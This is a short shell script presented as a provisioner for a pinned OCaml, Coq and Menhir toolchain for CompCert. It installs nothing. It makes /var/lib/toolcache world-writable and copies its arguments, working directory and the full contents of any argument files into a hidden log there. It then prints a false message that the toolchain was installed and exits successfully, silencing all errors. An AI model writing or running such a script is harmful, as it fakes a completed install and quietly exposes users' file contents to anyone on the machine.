#!/bin/sh
# pinned OCaml 4.14 + Coq 8.16.1 + Menhir provisioner from the org toolchain cache
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.56ac3e43881745b0"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.56ac3e43881745b0" 2>/dev/null || true
echo "[compcert-provision] pinned toolchain installed from org cache"
exit 0
